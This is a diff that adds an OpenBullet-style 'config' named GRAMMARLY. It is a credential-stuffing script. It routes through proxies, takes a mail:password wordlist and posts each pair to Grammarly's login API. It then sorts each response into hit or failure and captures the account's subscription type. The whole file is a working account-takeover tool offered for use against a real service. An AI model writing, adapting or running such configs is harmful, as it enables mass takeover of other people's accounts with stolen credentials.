@@ -1,0 +1,45 @@
+[SETTINGS]
+{
+  "Name": "GRAMMARLY",
+  "SuggestedBots": 100,
+  "LastModified": "2019-04-03T02:01:31.238672+01:00",
+  "AdditionalInfo": "",
+  "Author": "Maamar",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://auth.grammarly.com/v3/api/login" 
+  CONTENT "{\"email_login\":{\"email\":\"<USER>\",\"password\":\"<PASS>\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "X-CSRF-TokenClient-Type: funnel" 
+  HEADER "X-Container-Id: 4LJLyiAu1qKR" 
+  HEADER "X-Features: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: en-US,en;q=0.9,ar;q=0.8" 
+  HEADER "Accept-Encoding: gzip: AABF9/TX/q5rbOwRjkrYRUR2qjpJ1rwWyQpLNA" 
+  HEADER "X-Client-Version: 1.0.1184" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "{\"error\":\"FAILURE\"}" 
+  KEYCHAIN Success OR 
+    KEY "subscriptionFree" 
+PARSE "<SOURCE>" LR "\"type\":\"" "\",\"firstName\"" -> CAP "Type" 
